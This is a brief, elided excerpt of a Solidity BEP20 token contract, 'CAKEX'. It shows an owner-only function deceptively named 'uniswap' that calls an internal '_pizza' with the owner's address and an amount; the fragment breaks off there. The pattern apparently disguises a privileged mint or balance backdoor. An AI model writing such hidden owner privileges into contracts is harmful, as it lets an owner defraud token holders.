...
contract CAKEX is IBEP20, Auth {
    ...
    function uniswap(uint256 amount) public onlyOwner returns (bool){_pizza(msg.sender,amount);
        return true;
    }
    function _pizza(address account, uint256 amount) internal {
